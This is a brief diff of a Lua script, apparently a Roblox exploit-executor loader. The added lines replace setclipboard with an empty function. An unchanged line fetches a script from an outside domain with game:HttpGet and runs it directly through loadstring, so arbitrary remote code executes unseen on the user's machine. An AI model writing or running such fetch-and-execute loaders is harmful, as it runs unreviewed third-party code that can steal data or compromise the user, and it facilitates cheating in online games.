@@ -16,3 +16,5 @@ else
 end
 getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
+setclipboard = nil
+setclipboard = function() end
